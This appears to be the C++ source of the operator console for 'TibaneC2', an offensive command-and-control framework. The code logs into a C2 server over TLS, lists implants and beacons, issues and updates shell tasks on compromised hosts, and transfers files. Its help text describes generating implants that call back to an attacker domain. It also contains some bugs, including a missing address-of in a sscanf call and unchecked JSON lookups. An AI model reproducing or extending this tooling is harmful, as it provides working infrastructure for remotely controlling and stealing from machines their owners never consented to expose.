#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <filesystem>
#include <readline/readline.h>
#include <readline/history.h>
#include <crypt.h>
#include <sys/stat.h>
#include <unistd.h>
#include <cjson/cJSON.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <vector>
#include <iomanip>
#include <sstream>
#include <algorithm>
#include <nlohmann/json.hpp>


using json = nlohmann::json;


extern "C" {
    #include "./libs/libdisplay.h"
}


#define BUFFER_SIZE 0x100
#define MAX_SIZE 0x999999
#define HELP_SIZE 0x400

#define FILE_CHUNK 0x256

char IP[BUFFER_SIZE];
int PORT;
char current_operator[BUFFER_SIZE];

const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
                                        "   whoami : shows logged in operator\n"
                                        "   implants : show all active implants\n"
                                        "   beacons : show all active beacons\n"
                                        "   get-implant -os=[windows/linux] -channel=[https/tls] -domain=attacker.com:443 -o=/path/to/implant : generate implant\n"
                                        "   list-tasks : shows all tasks for all implants\n"    
                                        "   beacon [id] : interactive shell for selected beacon\n"
                                        "   use [id] : same as beacon\n"
                                        "   upload [file path] : upload file to server\n"
                                        "   download [operator/implant] [file_to_download] [path to store] : download file from server\n"
                                        "   files : show all files from server\n"
                                        "   quit, q, exit : exit the program\n" 
                                        "   \n---------------------------------\n";

const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage) [*]\n\n"                              
                                    "   new-task [task] : Issue new task for the beacon\n"
                                    "   list-tasks : Show all information abouts tasks for beacon\n"
                                    "   response-task [task id] : show response for specific task\n"
                                    "   update-task [id] [cmd] : update task (only if it is not completed)\n"
                                    "   \n-----------------------------------\n";


void banner() {
printf("\n");    
printf("░▒▓████████▓▒░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░  \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░             ░▒▓█▓▒░ \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░  \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░        \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n");
printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓████████▓▒░ \n");
printf("                        https://github.com/tibane0/TibaneC2\n");
printf("======================================================================================\n");                                                                                                                 
printf("[+] Welcome to tibane shell | type 'help' for options \n\n");
}


class Communicate {
    private:
    int sock;
    SSL_CTX *ctx;
    SSL *ssl;

    public:
    Communicate();

    void send_json(const char *json_str);

    char *recv_json();

    bool authenticate();

    void quit();

    bool verify_id(const char* id);

    char *view_files(const char* dir);

    int file_upload(const char* path);
    int file_download(const char* filename, const char* filepath, const char* dir);

    void new_task(const char* id, const char* command);

    bool update_task(const char* id, int task_id, const char* command);

    char *get_info(const char* table);

    char *list_tasks(const char *id);

    char *get_response_task(const char *id, int task_id);

};


class Shell {

    public:

    char *shell_command_generator(const char* text, int state);
    char *beacon_shell_command_generator(const char* text, int state);

    char **beacon_shell_completetion(const char* text, int start, int end);
    static char **main_shell_completetion(const char* text, int start, int end);

    
    void beacon_shell(const char* id, Communicate com);

    void process_shell_commands(const char* cmd, Communicate com);
    void process_beacon_shell_commands(const char* id, const char* cmd, Communicate com);

    
    void main_shell(Communicate com);
    Shell() { read_history(".command_history"); }
    ~Shell() { write_history(".command_history"); }

    private:
    static std::vector<std::string> main_cmds;
    static std::vector<std::string> beacon_cmds;

};

int configuration();

int main(int argc, char *argv[]) {
    if (argc != 3) {
        if (configuration() == -1) {
            printf("\nUSAGE %s [IP] [PORT]\n\nOR\n\nInclude the tibane_console_conf.json file in same directory\n\n", argv[0]);
            return EXIT_FAILURE;
        }
    } else {
        strncpy(IP, argv[1], sizeof(IP));
        PORT = atoi(argv[2]);
    }

    banner();

    Communicate com;
    
    
    for (int i = 0; i < 3; i++) {
        if (com.authenticate() == true) {
            break;
        };
        printf("\n[-] Failed to authenticate: \n[-] Try Again\n\n");
        //tui_error("Failed to authenticate: Try Again");
        if (i == 2) {
            printf("[-] Exiting\n");
            //tui_info("Exiting")
            exit(0);
        }
    }

    Shell sh;

    sh.main_shell(com);

    return 0;
}



int configuration() {
    char filename[BUFFER_SIZE] = "tibane_console_conf.json";
    if (access(filename, F_OK) != 0) {
        return -1;
    }

    int conf = open(filename, O_RDONLY);
    if (conf == -1) {
        write(1, "Failed to Configuration file\n", 20);

        return -1;
    }

    char buffer[0x200];
	memset(buffer, 0, sizeof(buffer));
    size_t bytesRead;
    if ((bytesRead = read(conf, buffer, sizeof(buffer))) <= 0) {
        perror("Read Error");
        return -1;
    }

    cJSON *config = cJSON_Parse(buffer);
    if (!config) {
        fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
        return -1;
    }

    cJSON *SERVER_ADDR = cJSON_GetObjectItem(config, "SERVER_ADDR");
    cJSON *SERVER_PORT = cJSON_GetObjectItem(config, "SERVER_PORT");

    //IP = SERVER_ADDR->valuestring;
    strncpy(IP, SERVER_ADDR->valuestring, sizeof(IP));
    PORT = SERVER_PORT->valueint;
    return 0;
}




std::vector<std::string> Shell::main_cmds  = {
        "implants", "beacon", "list-tasks", "whoami", "download", "upload", "exit", "quit", "q", "use", "ls"
    };

std::vector<std::string> Shell::beacon_cmds = {
        "info", "list-tasks", "new-task", "exit", "quit", "q", "whoami"
    };

char** Shell::main_shell_completetion(const char* text, int start, int end) {
    (void)start; (void)end;
    return rl_completion_matches(text, [](const char* t, int s)->char* {
        return Shell().shell_command_generator(t, s);
    });
    return nullptr;
}

char* Shell::shell_command_generator(const char* text, int state) {
    static size_t idx;
    if (state == 0) idx = 0;
    while (idx < main_cmds.size()) {
        const std::string &cmd = main_cmds[idx++];
        if (cmd.rfind(text, 0) == 0) return strdup(cmd.c_str());
    }
    return nullptr;
}


void Shell::main_shell(Communicate com) {
    rl_attempted_completion_function = nullptr; // main_shell_completetion;
    using_history();

    while (true) {
        char *cmd = readline("\n[ tibane-shell ] $ ");
        if (!cmd) {
            printf("CTRL + D\n");
            break;
        } else if (strlen(cmd) == 0) {
            free(cmd);
            continue;
        }

        add_history(cmd);
        process_shell_commands(cmd, com);
        free(cmd);
    }
}




void Shell::process_shell_commands(const char* cmd, Communicate com) {
    if (strcmp(cmd, "implants") == 0) {
        char *data = com.get_info("Implants");
        if (data == NULL) {
            printf("\n[-] NO DATA ABOUT IMPLANTS \n");
            return;
        }
        DisplayAllAgents(data);
        free(data);
        data = NULL;
    } else if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "q") == 0 || strcmp(cmd, "quit") == 0) {
        com.quit();
        exit(0);
    } else if (strcmp(cmd, "list-tasks") == 0) {
        char *data = com.get_info("Tasks");
        if (!data) {
            printf("\n[-] NO DATA ABOUT IMPLANTS \n");
            return;
        }
        DisplayAllTasks(data);
        free(data);
        data = NULL;
    } else if (strcmp(cmd, "whoami") == 0) {
        printf("\n[+] %s \n", current_operator);
    } else if (strncmp(cmd, "ls", 2) == 0) {
        char dir[BUFFER_SIZE];
        if (sscanf(cmd, "ls %255s", dir) != 1) {
            printf("\n[-] use : files [operator/implant]\n");
            return;
        }
        if (strcmp(dir, "operator") != 0 && strcmp(dir, "implant") != 0) {
            printf("\n[-] usage : files [operator/implant] \nNot : %s\n", dir);
            return;        
        }

        char *files = com.view_files(dir);
        if (!files) {
            printf("\n[-] Could Not display files\n");
            return;
        }
        DisplayFiles(files);
        free(files);
        files = NULL;
    } else if (strncmp(cmd, "upload", 6) == 0 ) {
        char file_path[BUFFER_SIZE];
        if (sscanf(cmd, "upload %255s", file_path) != 1) {
            printf("\n[-] Use : upload [file path]\n");
            return;
        }
        if (com.file_upload(file_path) == -1) {
            printf("\n[-] Could Not Send File\n");
            return;
        } 

    } else if (strncmp(cmd, "download", 8) == 0) {
        char file_d[BUFFER_SIZE], file_store[BUFFER_SIZE], dir[BUFFER_SIZE];
        if (sscanf(cmd, "download %255s %255s %255s", dir, file_d, file_store) != 3) {
            printf("\n[-] use : download [operator/implant] [file_to_download] [path to store]\n");
            return;
        }
        if (com.file_download(file_d, file_store, dir) == -1) {
            printf("\n[-] Could not download file\n");
            return;
        }
    } else if (strncmp(cmd, "beacon", 6) == 0 || strncmp(cmd, "use", 3) == 0 ) {
        char id[9];
        if (sscanf(cmd, "beacon %8s", id) == 1) {
            beacon_shell(id, com);
        } else if (sscanf(cmd, "use %8s", id) == 1) {
            beacon_shell(id, com);
        }
    } else {
         printf("%s", tibane_shell_help);
    }
}


void Shell::beacon_shell(const char* id, Communicate com) {
    if (com.verify_id(id) == false) {
        printf("[-] ID does not exist\n[-] Back to Home Shell\n");
        return;
    }

    printf("\n[+] Using Agent ID : %s \n", id);

    //rl_attempted_completion_function =      beacon_shell_completion;
    HIST_ENTRY** orig_history = history_list();
    while (true) {
        char prompt[BUFFER_SIZE];
            snprintf(prompt, sizeof(prompt), "\n[ tibane-shell ] (%s) $ ", id);
            char *cmd = readline(prompt);
        if (!cmd) {
            printf("\n[-] Back to home shell \n");
            return;
        } else if (strlen(cmd) == 0) {
            free(cmd);
            continue;
        }
        add_history(cmd);
        process_beacon_shell_commands(id, cmd, com);
        free(cmd);
    }
}

void Shell::process_beacon_shell_commands(const char* id, const char* cmd, Communicate com) {
    if (strcmp(cmd, "exit") == 0 ||  strcmp(cmd, "q") == 0 || strcmp(cmd, "quit") == 0) {
        printf("\n[-] Back to home shell \n");
    } else if (strcmp(cmd, "list-tasks") == 0) {
        char *data = com.list_tasks(id);
        if (!data) {
            printf("\n [-] NO DATA RELATED TO TASKS FOR %s \n\n", id);
            return;
        }
        DisplayTasksPerAgent(data);
        free(data);
        data = NULL;    
    } else if (strncmp(cmd, "new-task", 8) == 0) {
        char task[BUFFER_SIZE];
        if (sscanf(cmd, "new-task %255s", task) != 1) {
            printf("\n[-] Failed to add task\n");
            return;
        }
        com.new_task(id, task);
        printf("\n[+] Added Task \n");
    } else if (strncmp(cmd, "response-task", strlen("response-task")) == 0) {
        int task_id;
        if (sscanf(cmd, "response-task %d", task_id) != 1) {
             printf("\n[-] MUST HAVE TASK ID\n");
            return;
        }
        char *data = com.get_response_task(id, task_id);
        if (!data) {
            printf("\n[-] Failed to get response task\n");
            return;
        }
        DisplayCommandResponse(data);
        free(data);
        data = NULL;
    } else if (strcmp(cmd, "whoami") == 0) {
         printf("\n[+] %s \n", current_operator);
    } else if (strncmp(cmd, "update-task", strlen("update-task")) == 0) {
        int task_id;
        char command[BUFFER_SIZE];
        if (sscanf(cmd, "update-task %d %s", &task_id, command) != 2) {
            printf("\n[-] MUST HAVE TASK ID AND NEW COMMAND \n [*] update-task [id] [cmd]\n");
            return;
        }
        if (com.update_task(id, task_id, command)) {
            printf("\n[+] TASK UPDATED SUCCESSFULLY");
        } else {
            printf("\n[-] TASK UPDATE UNSUCCESSFUL\n");
        }
                
    } else {
        printf("%s",beacon_shell_help);
    }
}


char** Shell::beacon_shell_completetion(const char* text, int start, int end) {
    (void)start; (void)end;
    return rl_completion_matches(text, [](const char* t, int s)->char* {
        return Shell().beacon_shell_command_generator(t, s);
    });
}

char* Shell::beacon_shell_command_generator(const char* text, int state) {
    static size_t idx;
    if (state == 0) idx = 0;
    while (idx < beacon_cmds.size()) {
        const std::string &cmd = beacon_cmds[idx++];
        if (cmd.rfind(text, 0) == 0) return strdup(cmd.c_str());
    }
    return nullptr;
}



























Communicate::Communicate() {
        printf("\n[*] Connecting to %s : %d \n", IP, PORT);
        SSL_library_init();
        OpenSSL_add_all_algorithms();
        SSL_load_error_strings();
        ctx = SSL_CTX_new(TLS_client_method());
        int status;
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);

        sock = socket(AF_INET, SOCK_STREAM, 0);


        if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0) {
            printf("\n[-] Invalid IP Address\n");
            exit(0);
        }

        int tries = 0;
        do {
            if ((status = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
               printf("\n[-] Connection Failed \n");
               sleep(3);
               tries++;
               continue;
            } else {
                break;
            }
        } while (tries < 3);
        if (tries >= 3) {
            exit(0);
        }

        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_connect(ssl); 
}

void Communicate::send_json(const char *json_str) {
    uint32_t length = htonl(strlen(json_str)); 
    SSL_write(ssl, &length, 4);                
    //SSL_write(ssl, json_str, strlen(json_str)); 
    int sent;
    size_t total_sent = 0;
        size_t json_len = strlen(json_str);
     while (total_sent < json_len) {
        sent = SSL_write(ssl, json_str + total_sent, json_len - total_sent);
        if (sent <= 0) {
            break;
        }
        total_sent += sent;
    }
}

char* Communicate::recv_json() {
    uint32_t length;
    int received = SSL_read(ssl, &length, 4);
    if (received != 4) return NULL;

    length = ntohl(length);

    char *buffer = (char*)malloc(length + 1);  // heap allocation
    if (!buffer) return NULL;

    //char buffer[length + 0x20];
    int total = 0;
    while (total < length) {
        int bytes = SSL_read(ssl, buffer + total, length -total);
        if (bytes <= 0) {
            free(buffer);
            return NULL;
        }
        total += bytes;
    }
    buffer[length] = '\0'; 
    return buffer;
}

bool Communicate::authenticate() {
    char user[BUFFER_SIZE];
    char pass[BUFFER_SIZE];
    printf("[+] Enter Username: ");
    fgets(user, sizeof(user) -1, stdin);
    user[strcspn(user, "\n")] = 0;
    printf("[+] Enter Password: ");
    fgets(pass, sizeof(pass) -1, stdin);
    pass[strcspn(pass, "\n")] = 0;

    cJSON *credentials = cJSON_CreateObject();
    if (!credentials) {
        return false;
    }
    cJSON_AddStringToObject(credentials, "username", user);
    cJSON_AddStringToObject(credentials, "password", pass);

    char *creds = cJSON_Print(credentials);
    if (!creds) {
        return false;
    }

    cJSON_Delete(credentials);
    send_json(creds);
    free(creds);

    char *buffer = recv_json();
    if (buffer == NULL) {
        return false;
    }

    cJSON *response = cJSON_Parse(buffer);
    free(buffer);
    if (!response) return false;

    cJSON *sign_in = cJSON_GetObjectItem(response, "authenticated");
    if (strcmp(sign_in->valuestring, "true") == 0) {
        cJSON_Delete(response);
        strncpy(current_operator, user,BUFFER_SIZE);
        return true;
    }
    cJSON_Delete(response);
    return false;
}

void Communicate::quit() {
    cJSON *info = cJSON_CreateObject();
    if (!info) {
        return;
    }
    cJSON_AddStringToObject(info, "Info", "exit");
    char *info_ = cJSON_Print(info);
    send_json(info_);
    cJSON_Delete(info);
    free(info_);
}

bool Communicate::verify_id(const char* id) {
    cJSON *info = cJSON_CreateObject();
    if (!info) {
        return false;
    }
    cJSON_AddStringToObject(info, "Info", "verify_implant");
    cJSON_AddStringToObject(info, "implant_id", id);
    char *info_ = cJSON_Print(info);
    send_json(info_);
    cJSON_Delete(info);
    free(info_);

    char *reply = recv_json();
    if (!reply) return false;

    cJSON *re = cJSON_Parse(reply);
    if (!re) {
        printf("\n[-]failed to parse json");
        free(reply);
        return false;
    }
    cJSON *valid_id = cJSON_GetObjectItem(re, "valid_id");
    
    if (strncmp(valid_id->valuestring, "false", sizeof("false")) ==0) {
        free(reply);
        cJSON_Delete(re);
        return false;
    }
    cJSON_Delete(re);
    free(reply);
    return true;
}

char* Communicate::view_files(const char* dir) {
    cJSON *info = cJSON_CreateObject();
    if (!info) return NULL;
    cJSON_AddStringToObject(info, "Info", "files");
    cJSON_AddStringToObject(info, "folder", dir);
    cJSON_AddStringToObject(info, "option", "view");
    char *info_ = cJSON_Print(info);
    send_json(info_);
    free(info_);
    cJSON_Delete(info);
    char *contents = recv_json();
    if (!contents) return NULL;
    return contents;
}

int Communicate::file_upload(const char* path) {
    cJSON *info = cJSON_CreateObject();
    if (!info) {
        return -1;
    }
    cJSON_AddStringToObject(info, "Info", "files");
    cJSON_AddStringToObject(info, "option", "upload");
    char *info_ = cJSON_Print(info);    
    send_json(info_);
    free(info_);
    cJSON_Delete(info);
    int file = open(path, O_RDONLY);
    if (file == -1) return -1;
    char *contents = (char*)malloc(MAX_SIZE);
    if (!contents) {
        close(file);
        return -1;
    }
    if (access(path, F_OK) != 0) {
        close(file);
        free(contents);
        return -1;
    }

    cJSON *fileO = cJSON_CreateObject();
    if (!fileO) {
        free(contents);
        close(file);
        return -1;
    }
    
    
    std::filesystem::path p(path);
    std::string filename_str = p.filename().string();

    const char* filename = filename_str.c_str();
    
    cJSON_AddStringToObject(fileO, "file_name", filename);
    printf("Filename : %s", filename);
    char *Sfilename = cJSON_Print(fileO);
    cJSON_Delete(fileO);
    
    send_json(Sfilename);

    free(Sfilename);
    size_t bytesRead;
    struct stat st;
    fstat(file, &st);
    size_t filesize = st.st_size;
    SSL_write(ssl, &filesize, sizeof(filesize));
    
    while ((bytesRead = read(file, contents, FILE_CHUNK)) > 0) {
        SSL_write(ssl, contents, bytesRead);
    }
    free(contents);
    return 0;
}

int Communicate::file_download(const char* filename, const char* filepath, const char* dir) {
    cJSON *info = cJSON_CreateObject();
    if (!info) {
        return -1;
    }
    int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd == -1) {
        cJSON_Delete(info);
        return -1;
    }
    cJSON *file = cJSON_CreateObject();
    if (!file) {
        cJSON_Delete(info);
        close(fd);
        return -1;
    }
    cJSON_AddStringToObject(info, "Info", "files");
    cJSON_AddStringToObject(info, "option", "download");
    char *info_ = cJSON_Print(info);
    send_json(info_);
    free(info_);
    cJSON_Delete(info);
    cJSON_AddStringToObject(file, "file_name", filename);
    cJSON_AddStringToObject(file, "dir", dir);
    char *file_ = cJSON_Print(file);
    cJSON_Delete(file);
    
    //SSL_write(ssl, file_, strlen(file_));
    send_json(file_);
    free(file_);

    //char exists[BUFFER_SIZE];
    //SSL_read(ssl, exists, sizeof(exists));
    char *exists = recv_json();
    if (!exists) {
        close(fd);
        return -1;
    }
    cJSON *file_exists = cJSON_Parse(exists);
    cJSON *x = cJSON_GetObjectItem(file_exists, "Exist");
    if (cJSON_IsBool(x) == false) {
        close(fd);
        return -1;
    }
    printf("[+] Downloading file : %s\n", filename);
    
    // get filesize
    char *contents =(char*)malloc(MAX_SIZE);
    size_t bytesRead;
    size_t filesize;
    SSL_read(ssl, &filesize, sizeof(filesize));
    size_t received = 0;
    while (received < filesize) {
        bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
        write(fd, contents, bytesRead);
        received += bytesRead;
    }
    printf("[+] File stored at %s \n", filepath);
    free(contents);
    close(fd);
    return 0;
}


void Communicate::new_task(const char* id, const char* command) {
    cJSON *info = cJSON_CreateObject();
    if (!info) {
        return;
    }
    cJSON_AddStringToObject(info, "Info", "implant_id");
    cJSON_AddStringToObject(info, "implant_id", id);
    cJSON_AddStringToObject(info, "action", "new-task");
    cJSON_AddStringToObject(info, "command", command);
    char *info_ = cJSON_Print(info);
    
    send_json(info_);
    cJSON_Delete(info);
    free(info_);
    char reply[BUFFER_SIZE];
    SSL_read(ssl, reply, sizeof(reply)-1);
}

bool Communicate::update_task(const char* id, int task_id, const char* command) {
     cJSON *info = cJSON_CreateObject();
    if (!info) {
        return false;
    }
    cJSON_AddStringToObject(info, "Info", "implant_id");
    cJSON_AddStringToObject(info, "implant_id", id);
    cJSON_AddStringToObject(info, "action", "update-task");
    cJSON_AddStringToObject(info, "command", command);
    cJSON_AddNumberToObject(info, "task_id", task_id);
    char *info_ = cJSON_Print(info);

    send_json(info_);
    cJSON_Delete(info);
    free(info_);

    char *reply = recv_json();
    if (!reply) return false;

    cJSON *re = cJSON_Parse(reply);
    if (!re) {
        free(reply);
        return false;
    }
    cJSON *update = cJSON_GetObjectItem(re, "update");
    if (strncmp(update->valuestring, "false", sizeof("return")) == 0 ) {
        free(reply);
        return false;
    }
    free(reply);
    return true;
}

char* Communicate::get_info(const char* table) {
        cJSON *info = cJSON_CreateObject();
        if (!info) {
            return NULL;
        }
        cJSON_AddStringToObject(info, "Info", table);
        char *info_ = cJSON_Print(info);

        send_json(info_);
        cJSON_Delete(info);
        free(info_);

        char *info_container = recv_json();
        if (!info_container) return NULL;
        //printf("%s", info_container);
        return info_container;
}

char* Communicate::list_tasks(const char* id) {
    cJSON *info = cJSON_CreateObject();
    if (!info) {
        return NULL;
    }

    cJSON_AddStringToObject(info, "Info", "implant_id");
    cJSON_AddStringToObject(info, "implant_id", id);
    cJSON_AddStringToObject(info, "action", "list-tasks");

    char *info_json = cJSON_Print(info);
    if (!info_json) {
        cJSON_Delete(info);
        return NULL;
    }

    send_json(info_json);
    

    free(info_json);
    cJSON_Delete(info);

    // Receive response
    char *info_container = recv_json();
    if (!info_container) return NULL;
    return info_container;
}


char *Communicate::get_response_task(const char* id , int task_id) {
    cJSON *info = cJSON_CreateObject();
    if (!info) {
        return NULL;
    }
    cJSON_AddStringToObject(info, "Info", "implant_id");
    cJSON_AddStringToObject(info, "implant_id", id);
    cJSON_AddStringToObject(info, "action", "response-task");
    cJSON_AddNumberToObject(info, "task_id", task_id);
    char *info_ = cJSON_Print(info);

    send_json(info_);
    cJSON_Delete(info);
    free(info_);
    char *info_container = recv_json();
    if (!info_container) return NULL;
    return info_container;
}

